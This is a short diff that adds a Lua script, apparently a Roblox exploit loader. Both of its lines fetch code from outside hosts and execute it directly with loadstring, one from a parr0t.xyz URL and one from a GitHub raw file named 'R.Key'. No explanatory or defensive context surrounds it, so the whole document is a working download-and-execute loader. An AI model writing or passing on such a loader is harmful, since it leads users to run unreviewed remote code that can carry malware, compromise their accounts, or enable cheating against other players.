@@ -1,0 +1,5 @@
+function execute()
+    loadstring(game:HttpGet("https://parr0t.xyz/s/709af2f3-d0fe-4ed4-a1b2-ff00b8e032b5.lua", true))();
+end
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/R.Key")()
